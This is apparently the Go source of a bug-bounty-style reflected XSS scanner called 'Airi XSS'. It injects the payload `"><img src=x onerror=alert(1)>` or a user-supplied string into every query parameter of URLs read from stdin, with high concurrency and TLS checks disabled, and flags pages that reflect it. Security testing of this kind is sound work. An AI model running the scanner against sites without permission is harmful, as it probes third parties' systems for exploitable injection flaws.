package main

import (
        "bufio"
        "crypto/tls"
        "flag"
        "fmt"
        "io/ioutil"
        "net"
        "net/http"
        "net/url"
        "os"
        //"context"
        //"github.com/chromedp/cdproto/page"
        //"github.com/chromedp/chromedp"
        "strings"
	"regexp"
        "sync"
        "time"
)

func init() {
        flag.Usage = func() {
                help := []string{
                        "Airi XSS",
                        "",
                        "Usage:",
                        "+====================================================================================+",
                        "|       -p, -payload,         Reflection Flag, see readme for more information",
                        "|       -H, --headers,        Headers",
                        "|       -c                    Set Concurrency, Default: 50",
                        "|       -x, --proxy,          Send traffic to a proxy",
                        "|       -s, --only-poc        Show only potentially vulnerable urls",
                        "|       -hm, --headless-mode  Headless mode ( experimental ) please check readme",
                        "|       -h                    Show This Help Message",
                        "|",
                        "+====================================================================================+",
                        "",
                }

                fmt.Println(`
 _____ _     _
|  _  |_|___|_|_ _ ___ ___
|     | |  _| |_'_|_ -|_ -|
|__|__|_|_| |_|_,_|___|___|
`)
                fmt.Fprintf(os.Stderr, strings.Join(help, "\n"))

        }

}


type customheaders []string

func (m *customheaders) String() string {
 return "This message is for Setting Headers"
}

func (h *customheaders) Set(val string) error {
 *h = append(*h, val)
 return nil
}


var headers customheaders

func main() {

        var concurrency int
        flag.IntVar(&concurrency, "c", 50,"")

        var xsspayload string
        flag.StringVar(&xsspayload, "payload", "", "")
        flag.StringVar(&xsspayload, "p", "", "")

        var proxy string
        flag.StringVar(&proxy,"proxy", "0","")
        flag.StringVar(&proxy,"x", "0","")

		//payloadfile -pf

        var poc bool
        flag.BoolVar(&poc,"only-poc", false, "")
        flag.BoolVar(&poc,"s", false, "")

        var headless bool
        flag.BoolVar(&headless, "headless-mode", false, "")
        flag.BoolVar(&headless, "hm", false, "")

        // Headers flag
        flag.Var(&headers, "headers", "")
        flag.Var(&headers, "H", "")

        flag.Parse()

        visto := make(map[string]bool)
        std := bufio.NewScanner(os.Stdin)
        targets := make(chan string)


        var wg sync.WaitGroup
        for i:=0;i<concurrency;i++ {
                wg.Add(1)
                go func() {
                        defer wg.Done()
                        for v := range targets{

                            //if headless != false{
                                //h := HeadlessMode(v, poc, proxy)
                                //if h != "not"{fmt.Println(h)}

                            //}else{
                                if xsspayload != ""{
                                        x := xss(v, xsspayload, proxy, poc)
                                        if x != "ERROR" {
                                                fmt.Println(x)
                                                        }
                                }else{
                                                        x := xssDefault(v, xsspayload, proxy, poc)
                                                        if x != "ERROR"{
                                                                fmt.Println(x)
                                                        }
                                                }


                            //}
                        }


                }()
        }

        for std.Scan() {
            var line string = std.Text()
            if visto[line] != true{
                targets <- line
            }
            visto[line] = true

        }
        close(targets)
        wg.Wait()

}

func xss(urlt string, xssp string, proxy string, onlypoc bool) string {

        var trans = &http.Transport{
                MaxIdleConns:      30,
                IdleConnTimeout:   time.Second,
                DisableKeepAlives: true,
                TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
                DialContext: (&net.Dialer{
                        Timeout:   3 * time.Second,
                        KeepAlive: time.Second,
                }).DialContext,
        }


        client := &http.Client{
                Transport: trans,
                Timeout:   3 * time.Second,
                CheckRedirect: func(req *http.Request, via []*http.Request) error {
                        return http.ErrUseLastResponse
                                },
        }

        _, errx := url.Parse(urlt)
        if errx != nil {
            return "ERROR"
        }


        if proxy != "0" {
            if p, err := url.Parse(proxy); err == nil {
                trans.Proxy = http.ProxyURL(p)
        }}

        res, err := http.NewRequest("GET", urlt, nil)
        res.Header.Set("Connection", "close")

        for _, v := range headers{
                s := strings.SplitN(v, ":", 2)
                res.Header.Set(s[0], s[1])
        }



        resp, err := client.Do(res)
        // res.Header.Set("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36")

        if err != nil {
                return "ERROR"
        }
        defer resp.Body.Close()

        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
                return "ERROR"
        }

        page := string(body)
        var check_xss bool
	xssp = regexp.QuoteMeta(xssp)

	
        
                //fmt.Println(x)
				//x == param name
        regex := xssp
        match, _ := regexp.MatchString(regex, page)

        if match == true{
                check_xss = true
        }else{
                check_xss = false
        }

        if onlypoc != false{
                if check_xss != false{
                        return urlt
                }else{
                        return "ERROR"
                }
        }

        if check_xss != false {
                if onlypoc == false{
                        return "\033[1;31mVulnerable - "+urlt+"\033[0;0m"
                }
        }else{
                if onlypoc == false{
                        return "\033[1;30mNot Vulnerable - "+urlt+"\033[0;0m"
                }
        }
                
        
	return "ERROR"
        
}


func xssDefault(urlt string, xssp string, proxy string, onlypoc bool) string {



        var trans = &http.Transport{
                MaxIdleConns:      30,
                IdleConnTimeout:   time.Second,
                DisableKeepAlives: true,
                TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
                DialContext: (&net.Dialer{
                        Timeout:   3 * time.Second,
                        KeepAlive: time.Second,
                }).DialContext,
        }


        client := &http.Client{
                Transport: trans,
                Timeout:   3 * time.Second,
                CheckRedirect: func(req *http.Request, via []*http.Request) error {
                        return http.ErrUseLastResponse
                                },
        }
        //fmt.Println("TESTT")
        u, errx := url.Parse(urlt)
        if errx != nil {
            return "ERROR"
        }

        defaultPayload := `"><img src=x onerror=alert(1)>`
        q, err := url.ParseQuery(u.RawQuery)
        if err != nil{
                return "ERROR"
        }
        for x, _ := range q{
                //fmt.Println(x)
                q.Set(x, defaultPayload)
        }


        u.RawQuery = q.Encode()
        urlt = u.String()
        //fmt.Println(urlt)
        xssp = regexp.QuoteMeta(defaultPayload)
        //fmt.Printf("url: %s\n", u.String())


        if proxy != "0" {
            if p, err := url.Parse(proxy); err == nil {
                trans.Proxy = http.ProxyURL(p)
        }}

        res, err := http.NewRequest("GET", urlt, nil)
        res.Header.Set("Connection", "close")

        for _, v := range headers{
                s := strings.SplitN(v, ":", 2)
                res.Header.Set(s[0], s[1])
        }



        resp, err := client.Do(res)
        // res.Header.Set("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36")

        if err != nil {
                return "ERROR"
        }
        defer resp.Body.Close()

        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
                return "ERROR"
        }

        page := string(body)

        var check_xss bool

	
			//fmt.Println(x)
			//x == param name
        regex := xssp
        match, _ := regexp.MatchString(regex, page)

        if match == true{
                check_xss = true
        }else{
                check_xss = false
        }

        if onlypoc != false{
                if check_xss != false{
                        return urlt
                }else{
                        return "ERROR"
                }
        }
        

        if check_xss != false{
                if onlypoc == false{
                        return "\033[1;31mVulnerable - "+urlt+"\033[0;0m"
                }
        }else{
                if onlypoc == false{
                        return "\033[1;30mNot Vulnerable - "+urlt+"\033[0;0m"
                }
        }
			
	
	return "ERROR"

}
